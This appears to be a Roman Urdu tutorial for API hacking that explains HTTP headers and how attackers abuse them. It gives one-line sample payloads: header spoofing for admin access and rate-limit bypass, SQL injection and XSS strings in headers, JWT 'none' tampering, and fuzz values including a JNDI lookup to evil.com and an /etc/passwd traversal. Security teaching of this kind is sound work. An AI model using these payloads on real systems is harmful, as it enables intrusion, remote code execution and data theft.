The Importance of HTTP Headers

API Hacking ‚Üí Bunyadi Maloomat ‚Üí HTTP Protocol ‚Üí Headers Ki Ahmiyat

API hacking ke silsile mein, HTTP headers ko samajhna bunyadi hai kyunke yeh client aur server ke darmiyan communication mein aik ahem kirdar ada karte hain.

In mein aksar qeemti maloomat ya control mechanisms shamil hote hain jinhein exploit kiya ja sakta hai.

Headers sirf technical details nahin hain; woh API communication ke active components hain!

üìñ HTTP Headers Kya Hain?

Definition:

HTTP headers key-value pairs hotay hain jo HTTP request ya response ke sath bheje jatay hain.


Yeh message, bhejney walay, wasool karnay walay, ya khud payload ke baray mein metadata faraham karte hain.

Header Format
Header-Name: Header-Value Example: Content-Type: application/json Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)

üîÑ Request Headers vs Response Headers

üì§ Request Headers

Client se server ko bheje jane wale headers:

Content-Type
Client kis qism ka content bhej raha hai
Content-Type: application/json
Accept
Client kis qism ka content pasand karta hai
Accept: application/xml
Authorization
Authentication credentials
Authorization: Bearer token123
User-Agent
Client ke browser/OS ki maloomat
User-Agent: Chrome/96.0.4664.110
Host
Server ka address
Host: api.example.com
Cookie
Stored cookies bhejni hain
Cookie: sessionid=abc123

üì• Response Headers

Server se client ko bheje jane wale headers:

Content-Type
Server kis qism ka content bhej raha hai
Content-Type: application/json
Cache-Control
Response ko kaise cache karna hai
Cache-Control: no-cache, no-store
Set-Cookie
Client ko cookies set karne ke instructions
Set-Cookie: sessionid=xyz; HttpOnly
Server
Server ki tafseelat
Server: nginx/1.18.0
Location
Redirect ka location
Location: /newpath
Content-Security-Policy
Security policies
CSP: default-src 'self'

üéØ Headers API Hacking Ke Liye Kyun Ahem Hain?

6 Aham Wajuhat

Aik API hacker ke liye, headers maloomat ka khazana aur aik common attack vector hotay hain:

üì¢

1. Maloomat Zahir Karna

Server headers sensitive information expose kar sakte hain:

Server Maloomat:

Server header web server ki qism aur version zahir karta hai, jis mein maloom vulnerabilities ho sakti hain.

Server: Apache/2.4.41 (Ubuntu) X-Powered-By: PHP/7.4.3
Technology Stack:

X-Powered-By headers programming language ya framework ko be-naqab kar sakte hain.

X-Powered-By: Express X-AspNet-Version: 4.0.30319
Debug Maloomat:

X-Debug headers galti se internal error messages zahir kar sakte hain.

X-Debug-Token: abc123 X-Debug-Error: SQL syntax error at line 42
üîê

2. Authentication aur Authorization

Headers mein credentials ka exchange hota hai:

Authentication Tokens:

Authorization header mein API keys, JWT tokens, ya session tokens hotay hain.

Authorization: Bearer eyJhbGc... Authorization: Basic dXNlcjpwYXNz

Attack: Token manipulation, session hijacking

API Keys:

Custom headers mein API keys pass kiye jatay hain.

X-API-Key: sk_live_51234567890 Api-Token: abc-def-ghi-jkl

Attack: Key compromise se unauthorized access

üö™

3. Access Control Bypass

Headers ko modify kar ke privileges barhayi ja sakti hain:

Privilege Escalation:

Custom headers se admin access mil sakta hai.

X-Admin: true X-User-Role: administrator X-Forwarded-For: 127.0.0.1

Attack: Header injection se unchi privileges

IDOR via Headers:

Object IDs custom headers mein pass ho sakte hain.

X-User-ID: 123 X-Account-ID: admin-account

Attack: ID manipulation se IDOR

üõ°Ô∏è

4. Security Mechanism Bypass

Security checks ko headers ke through bypass kiya ja sakta hai:

Rate Limiting Bypass:

IP addresses ko spoof kar ke rate limiting se bach sakte hain.

X-Forwarded-For: 1.2.3.4 X-Real-IP: 5.6.7.8 User-Agent: BotScanner/1.0

Attack: Headers rotate kar ke limits bypass

Origin/Referer Bypass:

Security checks ko spoof kar sakte hain.

Origin: https://trusted-site.com Referer: https://admin.example.com

Attack: CSRF aur access control bypass

üíâ

5. Injection Attacks

Headers mein malicious data inject kiya ja sakta hai:

SQL Injection:

User-Agent ya custom headers mein SQL inject kar sakte hain.

User-Agent: ' OR '1'='1 X-Search-Query: admin' --

Attack: Database compromise

XSS via Headers:

Headers jo response mein reflect hote hain.

User-Agent: <script>alert(1)</script> X-Custom-Header: <img src=x onerror=alert(1)>

Attack: Cross-Site Scripting

üç™

6. Session Management

Cookies aur sessions headers ke through manage hote hain:

Cookie Manipulation:

Session cookies ko modify kar sakte hain.

Cookie: sessionid=abc123; role=user Modified: Cookie: sessionid=abc123; role=admin

Attack: Session hijacking, fixation

JWT Token Manipulation:

JSON Web Tokens ko tamper kar sakte hain.

Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0...

Attack: Algorithm confusion, signature bypass

Practical Implications

üîç 1. Interception aur Modification

Burp Suite jaise tools API hacking ke liye zaroori hain:

  • HTTP requests aur responses ko intercept karna
  • Tamam headers ko dekhna
  • Headers ko server/client ko bhejne se pehle modify karna
  • Automated attacks ke liye headers ko fuzz karna
Burp Suite ‚Üí Proxy ‚Üí Intercept ‚Üí Modify headers in real-time ‚Üí Test different header values ‚Üí Observe server responses

üé≤ 2. Fuzzing

Headers ko fuzz kiya ja sakta hai:

  • Ghair-mutawaqqe values bhejna
  • Ghalat qism ki values test karna
  • Posheeda vulnerabilities talaash karna
  • Ghair-mutawaqqe server behavior dekhna
Fuzzing Examples: User-Agent: ${jndi:ldap://evil.com/a} X-Forwarded-For: ../../../../etc/passwd Content-Length: -1 Authorization: Bearer null

üìä 3. Enumeration

Requests aur responses dono mein headers ka muaina:

  • API ke architecture ke baray mein clues
  • Istemal hone wale technologies ki pehchan
  • Mumkina kamzoriyon ki nishandahi
  • Security controls ka analysis
Analysis Points: ‚Üí Server: nginx ‚Üí Check for nginx CVEs ‚Üí X-Powered-By: Express ‚Üí Node.js backend ‚Üí Set-Cookie: HttpOnly missing ‚Üí Cookie theft possible ‚Üí No CORS headers ‚Üí Potential for attacks
